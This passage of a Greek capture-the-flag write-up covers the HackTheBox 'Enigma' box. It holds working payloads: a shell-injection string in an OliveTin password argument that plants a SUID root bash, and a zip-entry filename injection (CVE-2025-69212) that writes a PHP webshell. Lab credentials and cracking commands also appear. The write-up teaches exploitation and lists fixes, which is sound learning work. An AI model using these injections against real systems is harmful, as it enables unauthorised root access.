+    id: </span><span class="pr">backup_database</span><span class="po">
+    shell: "mysqldump -u {{ db_user }} -p'</span><span class="pr">{{ db_pass }}</span><span class="po">' {{ db_name }} &gt; /opt/backups/backup.sql"
+    arguments:
+      - name: db_pass
+        type: </span><span class="pr">password</span><span class="po">        </span><span class="pco"># NOT an ascii_identifier — never sanitised</span></div>
+  </div>
+
+  <p>Δύο από τα τρία ορίσματα είναι <code>ascii_identifier</code> (validated), αλλά το <code>db_pass</code> είναι τύπου <strong>password</strong> — ελεύθερης μορφής, χωρίς φιλτράρισμα χαρακτήρων — και ρίχνεται κατευθείαν σε ένα shell template. Κλείσε το εισαγωγικό <code>-p'…'</code> και κάνε inject.</p>
+
+  <div class="alert alert-warn">Η λεπτομέρεια που μου κόστισε χρόνο: αυτή η action είναι <strong>προσβάσιμη μόνο σαν haris</strong>. Από το webshell <code>www-data</code>, κάθε σύνδεση στο <code>127.0.0.1:1337</code> απλά κρεμούσε — ένα owner-match του firewall του host πετάει την κίνηση του web χρήστη προς το OliveTin. Γι' αυτό ακριβώς το box <em>χρειάζεται</em> το βήμα <code>su haris</code>· δεν είναι προαιρετική διακόσμηση. Σαν haris, το API επιστρέφει <code>200</code> αμέσως.</div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-enigma/img-olivetin-privesc.webp" type="image/webp"><img class="screenshot" src="assets/htb-enigma/img-olivetin-privesc.png" alt="OliveTin privesc diagram: www-data has RCE but is firewalled from port 1337, haris can reach the OliveTin API which runs the backup_database action as root guest, and the unsanitized db_pass password-type argument breaks out of the mysqldump shell to install a SUID root bash" width="1567" height="643" loading="lazy" decoding="async"></picture>
+
+  <p>Το OliveTin μιλάει ConnectRPC. Η ασύγχρονη μέθοδος <code>StartAction</code> πέταξε σιωπηλά το <code>actionId</code> μου· η κλήση που δουλεύει είναι το <strong><code>StartActionAndWait</code></strong>. Κάνε inject μέσω <code>db_pass</code> για να ρίξεις ένα SUID-root bash:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">StartActionAndWait — as haris</span>
+    </div>
+    <div class="term-body"><span class="pu">haris</span><span class="ps">@</span><span class="ph">enigma</span><span class="ps">:~$ </span><span class="pc">curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+     -H 'Content-Type: application/json' --data '{
+       "actionId":"backup_database",
+       "arguments":[
+         {"name":"db_user","value":"backup_svc"},
+         {"name":"db_pass","value":"x'"'"' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
+         {"name":"db_name","value":"production"}]}'</span>
+<span class="po">{"logEntry":{"actionTitle":"Backup Database","exitCode":0,"user":"</span><span class="pr">guest</span><span class="po">", ...}}</span></div>
+  </div>
+
+  <p>Το template κάνει render σαν <code>mysqldump -u backup_svc -p'x' ; install -m 4755 /bin/bash /tmp/.bs ; #' production …</code> — το <code>install</code> τρέχει σαν root και ρίχνει ένα setuid bash. Μετά το <code>-p</code> κρατά το effective UID στο 0:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">/tmp/.bs -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=33(www-data) </span><span class="pg">euid=0(root)</span><span class="po"> groups=33(www-data)
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">"Run buttons for shell commands" είναι μια συμμαζεμένη ιδέα μέχρι τα κουμπιά να παίρνουν ορίσματα ελεύθερης μορφής, να τρέχουν σαν root, και να δέχονται unauthenticated guests. Οποιοδήποτε από αυτά απενεργοποιημένο σταματά αυτό: validate/whitelist τιμές ορισμάτων, μην τρέχεις ποτέ τον daemon σαν root, και απαίτησε auth για exec. Το security-by-obscurity (binding στο loopback) αγόρασε μόνο έναν κανόνα firewall που ένα <code>su</code> νικά.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>→ kevin</td><td>Export NFS μοιρασμένο σε <code>*</code> με ένα έγγραφο credentials μέσα του (CWE-552 / CWE-284)</td></tr>
+    <tr><td>kevin → sandra</td><td>Κοινό temp password onboarding επαναχρησιμοποιημένο σε όλο το προσωπικό, ποτέ αλλαγμένο (CWE-521 / CWE-259)</td></tr>
+    <tr><td>→ www-data</td><td>Το OpenSTAManager ≤2.9.8 παρεμβάλλει ένα filename <code>.p7m</code> μέσα σε <code>exec()</code> — CVE-2025-69212 (CWE-78)</td></tr>
+    <tr><td>→ haris</td><td>Password DB σε config + ένα σπάσιμο bcrypt επαναχρησιμοποιημένο σαν password συστήματος (CWE-522)</td></tr>
+    <tr><td>→ root</td><td>OliveTin που τρέχει σαν root με guest exec και ένα unsanitised όρισμα τύπου-<code>password</code> σε ένα shell template (CWE-78 / CWE-269 / CWE-306)</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. NFS → credentials onboarding</span>
+<span class="pc">showmount -e &lt;IP&gt; ; sudo mount -t nfs &lt;IP&gt;:/srv/nfs/onboarding /tmp/onboarding -o ro</span>
+<span class="pc">pdftotext /tmp/onboarding/New_Employee_Access.pdf -   # kevin:Enigma2024!</span>
+
+<span class="pco"># 2. επαναχρησιμοποίηση → webmail sandra → OpenSTAManager admin:Ne3s4rtars78s</span>
+
+<span class="pco"># 3. CVE-2025-69212 → webshell (www-data)</span>
+<span class="pc">zip entry name: invoice.p7m";cd files &amp;&amp; echo '&lt;?php system($_GET[c]); ?&gt;' &gt; SHELL.php;echo ".p7m</span>
+<span class="pc">POST /actions.php  op=save id_module=14 id_plugin=48 blob=@exploit.zip</span>
+
+<span class="pco"># 4. credentials DB → σπάσε → haris</span>
+<span class="pc">mysql -u brollin -p'Fri3nds@9099' openstamanager -e 'SELECT username,password FROM zz_users;'</span>
+<span class="pc">hashcat -m 3200 haris.hash rockyou.txt   # bestfriends → su haris</span>
+
+<span class="pco"># 5. OliveTin (σαν haris) → root</span>
+<span class="pc">curl http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+  --data '{"actionId":"backup_database","arguments":[{"name":"db_pass",
+  "value":"x'"'"' ; install -m 4755 /bin/bash /tmp/.bs ; #"}, ...]}'</span>
+<span class="pc">/tmp/.bs -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
